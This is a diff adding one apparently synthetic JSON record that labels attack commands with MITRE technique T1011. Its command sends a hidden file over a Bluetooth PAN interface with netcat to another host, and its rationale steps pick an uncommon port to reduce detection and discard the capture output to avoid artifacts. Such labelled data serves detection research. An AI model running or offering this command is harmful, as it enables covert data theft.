@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i bnep0 -nn tcp port 53211 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.44.10 192.168.44.20 53211 < /var/tmp/.cache/img.dat",
+  "explanation": "Exfiltrates data over a Bluetooth PAN interface (bnep0) using a high, uncommon TCP port while passively monitoring only that flow with tcpdump. This leverages a non-primary network medium, aligning with T1011.",
+  "rationale_steps": [
+    "Bind transfer to Bluetooth PAN (bnep0) to use an alternate medium.",
+    "Choose uncommon TCP port 53211 to reduce detection.",
+    "Start tcpdump on bnep0 for that port and discard output to avoid artifacts.",
+    "Send the file using netcat with -s to pin the source to the bnep0 IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-00c22397",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
